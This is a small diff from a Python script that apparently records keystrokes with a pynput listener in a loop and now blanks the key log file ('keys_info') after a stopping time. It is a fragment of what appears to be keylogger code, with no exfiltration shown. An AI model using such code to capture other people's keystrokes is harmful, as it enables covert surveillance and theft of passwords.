@@ -156,3 +156,7 @@ while number_of_iterations < number_of_iterations_end:
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
+    if currentTime > stoppingTime:
+        with open(file_merge + keys_info, "w") as f:
+            f.write(" ")
